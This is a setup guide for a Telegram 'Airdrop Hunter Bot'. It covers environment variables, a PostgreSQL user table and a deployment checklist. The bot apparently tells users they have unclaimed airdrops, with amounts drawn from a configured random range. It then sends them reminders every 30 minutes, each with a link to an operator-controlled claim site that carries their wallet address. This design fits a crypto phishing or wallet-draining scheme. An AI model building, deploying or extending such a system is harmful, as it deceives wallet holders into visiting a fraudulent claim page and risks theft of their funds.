# Environment Setup for Enhanced Reminder System

## Required Environment Variables

### Essential Configuration
```bash
# Bot Configuration
BOT_TOKEN=your_telegram_bot_token_here
ADMIN_USERNAME=your_telegram_username

# Claim URL (Required for Reminder System)
CLAIM_URL=https://your-claim-website.com

# Database Configuration
DATABASE_URL=postgresql://username:password@host:port/database

# Optional: Notification System
NOTIFICATION_BOT_TOKEN=separate_bot_token_for_admin_notifications
NOTIFICATION_CHAT_ID=your_telegram_chat_id_for_notifications
```

### Claim URL Configuration

The `CLAIM_URL` environment variable is critical for the enhanced reminder system:

**How it works:**
- Base URL from environment: `CLAIM_URL=https://myclaim.site`
- Bot generates unique parameters: `?id=AH123ABC&wallet=0x123...`
- Final URL: `https://myclaim.site?id=AH123ABC&wallet=0x123...`

**URL Parameters:**
- `id`: Unique claim identifier (format: AH + timestamp + random + wallet suffix)
- `wallet`: User's wallet address for verification

**Example Generated URLs:**
```
https://myclaim.site?id=AH1K2M3N4P&wallet=0x742d35cc6bf4c532a61f7e6b5bb17174b8c4f8e9
https://myclaim.site?id=AH5Q6R7S8T&wallet=0xa0b86991c431e8c4526d5b09c4ea0bb34f9f4d4c
```

### Database Setup Commands

Run these SQL commands to prepare the database:

```sql
-- Create enhanced bot_users table
CREATE TABLE IF NOT EXISTS bot_users (
    id BIGINT PRIMARY KEY,
    username VARCHAR(255),
    first_name VARCHAR(255),
    last_name VARCHAR(255),
    is_active BOOLEAN DEFAULT true,
    last_interaction TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    wallet_count INTEGER DEFAULT 0,
    airdrop_count INTEGER DEFAULT 0,
    last_wallet_address VARCHAR(255),
    pending_airdrop_amount INTEGER DEFAULT 0,
    pending_airdrop_projects TEXT,
    pending_airdrop_claim_url TEXT,
    last_analysis_date TIMESTAMP,
    has_unclaimed_airdrops BOOLEAN DEFAULT false,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add indexes for performance
CREATE INDEX IF NOT EXISTS idx_bot_users_unclaimed_airdrops 
ON bot_users (has_unclaimed_airdrops, is_active, last_interaction);

CREATE INDEX IF NOT EXISTS idx_bot_users_last_analysis 
ON bot_users (last_analysis_date, is_active, last_interaction);
```

### Optional Configuration

```bash
# Airdrop Amount Ranges
MIN_AIRDROP_AMOUNT=5000
MAX_AIRDROP_AMOUNT=20000

# Bot Branding
BOT_NAME=Airdrop Hunter Bot
BOT_USERNAME=@yourbotusername
```

## Deployment Checklist

1. **Set Environment Variables**
   - Configure `CLAIM_URL` to point to your claim website
   - Set `BOT_TOKEN` from BotFather
   - Configure `DATABASE_URL` for PostgreSQL

2. **Database Setup**
   - Run the SQL commands above
   - Verify table structure with enhanced columns

3. **Test Configuration**
   - Start bot and analyze a test wallet
   - Check database for saved airdrop data
   - Verify reminder messages include correct claim URLs

4. **Monitor Reminders**
   - Reminders run every 30 minutes
   - Check logs for successful delivery
   - Verify claim buttons link to your domain

## Troubleshooting

**Issue: Claim URLs don't work**
- Solution: Verify `CLAIM_URL` environment variable is set
- Check: URLs should include `?id=` and `&wallet=` parameters

**Issue: No personalized reminders**
- Solution: Users need to analyze wallets first to generate airdrop data
- Check: Database `has_unclaimed_airdrops` column should be true

**Issue: Database errors**
- Solution: Run `DATABASE_SETUP.sql` to add required columns
- Check: Verify PostgreSQL connection with `DATABASE_URL`